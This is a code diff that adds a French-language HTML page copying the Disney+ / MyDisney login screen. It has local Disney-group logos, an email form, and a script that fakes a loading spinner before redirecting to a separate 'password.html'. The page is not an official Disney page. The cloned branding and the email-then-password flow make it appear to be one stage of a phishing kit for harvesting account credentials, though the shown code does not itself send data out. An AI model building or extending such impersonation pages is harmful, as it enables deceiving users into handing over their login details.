@@ -1,24 +1,217 @@
-body {
-  margin: 0;
-  font-family: Arial, Helvetica, sans-serif;
-  background: radial-gradient(circle at top, #003264 0%, #032541 100%);
-  min-height: 100vh;
-  display: flex;
-  align-items: start; /* modifié de center à start */
-  justify-content: center;
-  padding: 60px 20px 30px; /* ajout de padding top pour descendre le bloc */
-}
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connexion | Disney+</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: radial-gradient(circle at top, #003264 0%, #032541 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 60px 20px 30px;
+    }
 
-main {
-  margin-top: 20px; /* pour l’abaisser un peu */
-}
+    main {
+      background-color: #fff;
+      color: #000;
+      max-width: 420px;
+      width: 100%;
+      border-radius: 20px;
+      padding: 40px 30px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
 
-/* Logos en bas bien centrés */
-.logos-container {
-  display: flex;
-  flex-wrap: wrap;
-  justify-content: center; /* changé de start à center */
-  align-items: center;
-  gap: 14px;
-  margin-top: 14px;
-}
+    .logo {
+      width: 120px;
+      margin: 0 auto 20px;
+      display: block;
+    }
+
+    .my-disney {
+      width: 180px;
+      max-width: 100%;
+      margin: 10px auto 30px;
+      display: block;
+    }
+
+    h1 {
+      font-size: 1.6rem;
+      margin-bottom: 12px;
+    }
+
+    p {
+      font-size: 0.95rem;
+      color: #333;
+      margin-bottom: 24px;
+      line-height: 1.4;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 16px;
+      font-size: 1rem;
+      border-radius: 8px;
+      border: none;
+      background-color: #f0f0f0;
+      margin-bottom: 25px;
+      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
+      box-sizing: border-box;
+    }
+
+    button {
+      width: 100%;
+      padding: 16px;
+      background-color: #000;
+      color: #fff;
+      font-weight: bold;
+      font-size: 1rem;
+      border: none;
+      border-radius: 999px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #222;
+    }
+
+    .footer-note {
+      font-size: 0.75rem;
+      color: #444;
+      margin-top: 30px;
+      line-height: 1.4;
+      text-align: left;
+    }
+
+    .logos-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: center;
+      gap: 14px;
+      margin-top: 14px;
+    }
+
+    .logos-container img {
+      height: 22px;
+      opacity: 0.7;
+      filter: grayscale(100%);
+    }
+
+    a {
+      color: #0063e5;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 480px) {
+      main {
+        padding: 30px 20px;
+      }
+
+      h1 {
+        font-size: 1.4rem;
+      }
+
+      .logo {
+        width: 100px;
+        margin-bottom: 12px;
+      }
+
+      .my-disney {
+        width: 140px;
+        margin-bottom: 24px;
+      }
+
+      .logos-container img {
+        height: 20px;
+      }
+    }
+
+    /* Spinner Overlay */
+    #spinnerOverlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.9);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      display: none;
+    }
+
+    .spinner {
+      width: 70px;
+      height: 70px;
+      border: 8px solid rgba(255, 255, 255, 0.1);
+      border-top: 8px solid #00bfff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <main>
+    <!-- Logo principal Disney+ -->
+    <img src="Images/compose2.png" alt="Disney+" class="logo" />
+
+    <!-- Logo MyDisney -->
+    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="my-disney" />
+
+    <h1>Entrez votre adresse e-mail pour continuer</h1>
+    <p>
+      Identifiez-vous sur Disney+ avec votre compte MyDisney. Si vous n'en avez pas, vous serez invité(e) à en créer un.
+    </p>
+
+    <form id="loginForm">
+      <input type="email" placeholder="Adresse e-mail" required />
+      <button type="submit">Continuer</button>
+    </form>
+
+    <div class="footer-note">
+      <strong>Disney+ fait partie des entreprises du groupe Walt Disney</strong><br />
+      MyDisney vous permet d'accéder facilement aux différents services des entreprises du groupe Walt Disney, comme Disney+, ESPN, Walt Disney World <a href="#">et bien +</a>.
+
+      <div class="logos-container">
+        <img src="Images/compose2.png" alt="Disney+" />
+        <img src="Images/abc-logo-image-4413.png" alt="ABC" />
+        <img src="Images/espn-png-logo-4149.png" alt="ESPN" />
+        <img src="Images/marvel-logo-34291.png" alt="Marvel" />
+        <img src="Images/star-wars-logo-1002.png" alt="Star Wars" />
+        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu" />
+        <img src="Images/natgeo-logo.png" alt="National Geographic" />
+      </div>
+    </div>
+  </main>
+
+  <!-- Spinner Overlay -->
+  <div id="spinnerOverlay">
+    <div class="spinner"></div>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      document.getElementById("spinnerOverlay").style.display = "flex";
+      setTimeout(() => {
+        window.location.href = "password.html";
+      }, 2500);
+    });
+  </script>
+
+</body>
+</html>
